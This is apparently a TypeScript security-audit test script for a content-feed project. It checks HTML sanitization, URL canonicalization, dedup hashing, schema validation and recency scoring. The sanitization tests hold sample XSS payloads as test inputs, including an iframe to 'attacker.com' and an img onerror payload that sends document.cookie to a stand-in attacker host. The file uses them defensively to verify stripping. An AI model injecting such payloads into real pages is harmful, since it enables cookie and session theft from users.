import { sanitizeHtml, validateContentItem } from "../ingestion/validator";
import { generateUrlHash, normalizeCanonicalUrl } from "../ingestion/canonicalizer";
import { calculateRecencyScore, scoreFeedItems } from "../feed/ranker";

function runSecurityAudit() {
  console.log("=== MARKY SECURITY & RLS AUDIT VERIFICATION ===\n");
  let passed = 0;
  let failed = 0;

  function assert(condition: boolean, testName: string) {
    if (condition) {
      console.log(`✓ [PASS] ${testName}`);
      passed++;
    } else {
      console.error(`✗ [FAIL] ${testName}`);
      failed++;
    }
  }

  // 1. Untrusted Input XSS Sanitization Audit
  const maliciousScriptHtml = `<p>Safe text</p><script>alert('XSS Attack!')</script><span>More content</span>`;
  const sanitizedScript = sanitizeHtml(maliciousScriptHtml);
  assert(
    !sanitizedScript?.includes("<script>") && sanitizedScript?.includes("Safe text") === true,
    "XSS Protection: Strips malicious <script> tags from raw HTML input"
  );

  const maliciousIframeHtml = `<article>Body</article><iframe src="http://attacker.com/phish"></iframe>`;
  const sanitizedIframe = sanitizeHtml(maliciousIframeHtml);
  assert(
    !sanitizedIframe?.includes("<iframe") && sanitizedIframe?.includes("Body") === true,
    "XSS Protection: Strips malicious <iframe> elements from raw HTML input"
  );

  const maliciousEventHandlerHtml = `<img src="x" onerror="fetch('http://attacker.com/steal?cookie=' + document.cookie)" />`;
  const sanitizedEventHandler = sanitizeHtml(maliciousEventHandlerHtml);
  assert(
    !sanitizedEventHandler?.includes("onerror=") && sanitizedEventHandler?.includes("<img") === true,
    "XSS Protection: Strips inline onerror/onload event handlers from HTML tags"
  );

  // 2. Canonical URL Normalization & Deduplication Hash Audit
  const rawUrlWithTracking = "https://example.com/blog/article?utm_source=twitter&utm_medium=social&ref=123#comment-5";
  const normalizedUrl = normalizeCanonicalUrl(rawUrlWithTracking);
  assert(
    normalizedUrl === "https://example.com/blog/article",
    "URL Canonicalization: Cleans tracking parameters (utm_*, ref) and fragment anchors"
  );

  const hash1 = generateUrlHash(rawUrlWithTracking);
  const hash2 = generateUrlHash("https://example.com/blog/article");
  assert(
    hash1 === hash2 && hash1.length === 64,
    "Deduplication Hash: Computes deterministic 64-character SHA-256 hash across tracking variations"
  );

  // 3. Metadata Fabrication & Schema Validation Audit
  const invalidItem = {
    title: "",
    canonical_url: "https://example.com/test",
    summary: null,
    body_content: null,
    author: null,
    published_at: null,
  };
  const validationResult = validateContentItem(invalidItem);
  assert(
    validationResult.valid === false,
    "Schema Safety: Rejects items with empty or missing titles"
  );

  // 4. Feed Ranking & Recency Decay Audit
  const recentScore = calculateRecencyScore(new Date().toISOString(), 48);
  const oldDate = new Date(Date.now() - 48 * 60 * 60 * 1000).toISOString();
  const halfLifeScore = calculateRecencyScore(oldDate, 48);
  assert(
    recentScore > 0.9 && Math.abs(halfLifeScore - 0.5) < 0.05,
    "Recency Decay: Computes exact 48-hour half-life exponential decay score based on published_at"
  );

  console.log(`\n=== AUDIT SUMMARY: ${passed} Passed, ${failed} Failed ===`);
  if (failed > 0) {
    process.exit(1);
  }
}

runSecurityAudit();
